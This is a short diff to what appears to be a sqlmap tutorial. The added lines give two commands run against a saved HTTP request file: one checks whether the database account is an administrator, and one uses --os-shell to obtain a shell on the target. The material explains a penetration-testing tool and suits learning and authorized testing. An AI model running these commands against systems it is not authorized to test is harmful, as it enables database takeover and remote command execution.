@@ -31,3 +31,9 @@ Referer: http://www.abc.com/
 .........
 
 Step6.After modifying, we save it and use it to be the value of the parameter 'r' for sqlmap.
+
+1.5.sqlmap -r {request_file} --batch --is-dba:
+This command is for check whether the current account is DB administrator or not.
+
+1.6.sqlmap -r {request_file} --batch --os-shell:
+This command is for doing some attack to get the shell of the target.
